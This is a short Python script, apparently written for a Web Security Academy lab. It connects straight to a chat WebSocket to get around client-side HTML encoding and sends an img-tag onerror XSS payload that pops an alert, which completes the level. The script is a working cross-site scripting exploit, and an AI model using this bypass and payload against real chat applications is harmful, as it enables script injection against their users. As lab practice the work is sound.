import asyncio
import websockets
import json


if __name__ == "__main__":
    async def chat():
        websocket_uri = "wss://acb81f4a1e795df1c094102a00110060.web-security-academy.net/chat"
        async with websockets.connect(websocket_uri) as websocket:
            # In-case I don't remember what this is doing here:
            # This websocket client/server implementation had implemented html encoding sanitation in the client app
            # SO we communicate with the server directly in this program to get around that sanitation.
            # SO we can send in HTML which will get invoked by the server.
            # This IMG tag is setup w/ an invalid src attribute, and an onerror event handler which simply
            # causes an alert popup in the ctf server (which is what you need to do to complete the level)
            msg = {'message': "<img src=1 onerror=javascript:alert(1) />"}
            json_msg = json.dumps(msg)
            print(f"Sending {json_msg}")
            await websocket.send(json_msg)
            resp = await websocket.recv()
            print(f"Received {resp}")


    asyncio.get_event_loop().run_until_complete(chat())
